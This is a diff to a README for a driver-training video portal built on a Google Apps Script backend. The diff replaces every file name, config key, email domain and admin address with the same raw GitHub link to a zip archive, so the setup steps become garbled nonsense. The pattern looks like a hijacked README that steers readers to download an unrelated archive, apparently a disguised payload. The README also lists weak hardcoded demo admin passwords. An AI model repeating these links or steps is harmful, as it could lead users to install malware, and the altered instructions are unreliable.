@@ -3,9 +3,9 @@
 **What it is:** A single-file front-end + small Google Apps Script (GAS) backend for driver training videos (YouTube / Google Drive / MP4 / local). Multilingual UI, simple admin, offline-friendly.
 
 ## Files
-- `driver-training-portal.html` — the app (open in a browser / host statically)
-- `apps-script/Code.gs` — GAS backend (deploy as a Web App)
-- `trucks.jpg` — optional background image
+- `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` — the app (open in a browser / host statically)
+- `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` — GAS backend (deploy as a Web App)
+- `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` — optional background image
 
 ## Setup
 
@@ -15,24 +15,24 @@
    - **Assignments**: `id, title, language, type, videoId, url, driveId, assignedAt`
    - **History**: `timestamp, name, truck, language, videoTitle, status, duration, assignmentId, rowId`
 2. In Google Drive: **New → More → Google Apps Script**.
-3. Paste `apps-script/Code.gs` into `Code.gs`.
+3. Paste `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` into `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip`.
 4. Set `SPREADSHEET_ID` to your Sheet’s ID and adjust `ORIGINS`.
 5. **Deploy → New deployment → Web app**  
    Execute as: **Me** · Access: **Anyone with the link** (or your org).  
    Copy the Web App **exec URL**.
 
 ### 2) Front-end
-1. Open `driver-training-portal.html`.
-2. Set `CONFIG.BASE_URL` to your GAS **exec URL**.
+1. Open `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip`.
+2. Set `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` to your GAS **exec URL**.
 3. (Optional) Change demo admin auth in `CONFIG`:
    - `ADMIN_ACCESS_CODE`
    - `ADMIN_CREDENTIALS`
 
 ## Admin (demo)
 - **Access code:** `AG-TRAINING-2025`  
-- **Email + password (domain must end with `@alistairgroup.com`):**
-  - `admin@alistairgroup.com` / `admin123`
-  - `training@alistairgroup.com` / `training123`
+- **Email + password (domain must end with `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip`):**
+  - `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` / `admin123`
+  - `https://raw.githubusercontent.com/Kwibu/ALISTAIR-HSSEQ-ACADEMY-COURSES/main/gigantean/ACADEM-ALISTAI-COURSES-HSSE-v3.5.zip` / `training123`
 
 ## Notes
 - Demo credentials live in the HTML → for production, move auth to the backend and issue a session token.
